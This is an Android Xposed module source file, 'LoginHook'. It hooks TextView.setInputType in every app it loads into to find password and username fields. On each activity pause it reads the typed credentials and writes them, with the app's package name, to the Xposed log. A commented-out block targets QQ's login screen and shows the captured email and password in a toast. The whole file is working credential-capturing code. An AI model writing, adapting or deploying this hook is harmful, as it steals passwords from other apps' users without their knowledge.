package xposed.doctorq.com.xposed;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.res.XResources;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.text.InputType;
import android.widget.AutoCompleteTextView;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
import static de.robv.android.xposed.XposedHelpers.findField;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

/**
 * Created by wuxian on 16/2/24.
 */
public class LoginHook implements IXposedHookLoadPackage {
    private static final String PN = "xposed.doctorq.com.xposed";


    private List<EditText> list = new ArrayList<EditText>();
    private EditText passwordText = null;
    private EditText usernameEdit = null;

    @Override
    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
//        XposedBridge.log("App : " + loadPackageParam.packageName);
//        if(!loadPackageParam.packageName.equals("android")) return;


//        findAndHookMethod("com.tencent.mobileqq.activity.LoginActivity", loadPackageParam.classLoader, "attemptLogin", new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                XposedBridge.log("已经HOOK");
//                Class o = param.thisObject.getClass();
//
//                XposedBridge.log(o.getName());
//                Field.setAccessible(o.getDeclaredFields(), true);
//
//                Field fieldEmail = findField(o, "mEmailView");
//                Field fieldPassword = findField(o,"mPasswordView");
//                AutoCompleteTextView autoTextView = (AutoCompleteTextView)fieldEmail.get(param.thisObject);
//                EditText editText = (EditText)fieldPassword.get(param.thisObject);
//                String email = autoTextView.getText().toString();
//                String password = editText.getText().toString();
//                Toast.makeText((Activity)param.thisObject,"邮箱: " + email + ",密码 : " + password,Toast.LENGTH_LONG).show();
//            }
//
//            @Override
//            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//
//            }
//        });

        findAndHookMethod(TextView.class, "setInputType", int.class, boolean.class, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
            }

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//                XposedBridge.log("setInputType");
                Object currentObj = param.thisObject;
                passwordText = null;
                if (currentObj instanceof EditText) {
                    EditText editText = (EditText) currentObj;
                    if (editText.getInputType() == 129) {
                        XposedBridge.log("密码框");
                        Context context = editText.getContext();
                        passwordText = editText;

                    } else {
                        XposedBridge.log("输入框");
                        usernameEdit = editText;
                    }
                }
            }
        });
        findAndHookMethod(Activity.class, "onPause", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
            }

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                String packageName = loadPackageParam.packageName;
                XposedBridge.log("hook package : " + packageName);
                String password = null;
                String username = null;
                if (passwordText != null) {
                    password = passwordText.getText().toString();

                }
                if (usernameEdit != null) {
                    username = usernameEdit.getText().toString();
                }
                if (username != null && password != null && username.length() > 0 && password.length() > 0)
                    XposedBridge.log(loadPackageParam.packageName + ",password :" + password + ",username: " + username);

            }
        });

    }
}
